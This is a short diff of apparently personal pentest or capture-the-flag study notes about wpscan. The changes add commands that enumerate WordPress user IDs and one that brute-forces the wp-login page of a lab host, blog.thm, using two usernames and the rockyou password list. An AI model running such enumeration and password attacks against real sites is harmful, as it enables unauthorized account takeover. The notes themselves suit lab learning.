@@ -63,14 +63,15 @@ This gives the username and password
 this a terminal tool.
 to scan the word press plugins
 
+this will enumerate the the user ids
 
 	wpscan --url given_url --enumerate u
+	or
+	wpscan --url url -e u
 
 To enumerate username and password:
 
-
-
-this will enumerate the the user ids
+wpscan --url blog.thm -U kwheel,bjoel -P /opt/wordlists/rockyou.txt --password-attack wp-login -t 64
 
 
 3. ADB:
